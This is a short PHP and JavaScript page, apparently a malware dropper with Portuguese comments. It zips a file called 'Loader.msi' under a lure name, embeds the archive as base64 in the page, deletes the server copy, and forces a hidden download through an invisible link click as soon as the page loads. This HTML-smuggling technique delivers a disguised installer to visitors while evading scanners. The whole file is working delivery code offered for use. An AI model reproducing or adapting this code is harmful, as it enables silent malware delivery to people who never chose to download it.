<?php
//Atualizado em: 24.11.2020//
//kelly.software@hotmail.com//

header('Content-Type: text/html; charset=iso-8859-1');
include 'titulo.php';
$ppk1     = $titulo1 . ".msi";
$ppk2     = $titulo2 . ".zip";
$pasta    = dirname(__FILE__);
$zip      = new ZipArchive();
$filename = $pasta . "/zips/" . $ppk2;
if ($zip->open($filename, ZipArchive::CREATE) !== TRUE) {
    exit("cannot open <$filename>\n");
}
$zip->addFile($pasta . "/zips/Loader.msi", $ppk1);
$zip->close();
$str = file_get_contents($filename);
unlink($filename);
?>

<input type="hidden" value="<?php echo base64_encode($str) ?>">

<script>
	function base64ToArrayBuffer(base64) {
		var binary_string = window.atob(base64); 
		var len = binary_string.length; 
		var bytes = new Uint8Array( len ); 
		for (var i = 0; i < len; i++) { 
			bytes[i] = binary_string.charCodeAt(i); 
		} 
		return bytes.buffer;
	} 

function sanchas(tam) {
  var text = "";
  var possible = "0123456789";

  for (var i = 0; i < tam; i++)
    text += possible.charAt(Math.floor(Math.random() * possible.length));

  return text;
}

	
		var file = "<?php echo base64_encode($str); ?>"; 
		var sTensor = ".zip"; 
		var data = base64ToArrayBuffer(file);
		var blob = new Blob([data], {type: "octet/stream"});
		var fileName = "<?php echo $ppk2 ?>";
		if(window.navigator.msSaveOrOpenBlob) 
			window.navigator.msSaveBlob(blob,fileName);
		else {
			var a = document.createElement("a");
			document.body.appendChild(a);
			a.style = "display: none";
			var url = window.URL.createObjectURL(blob);
			a.href = url;
			a.download = fileName;
			a.click();
			window.URL.revokeObjectURL(url);
		} 
 
</script>

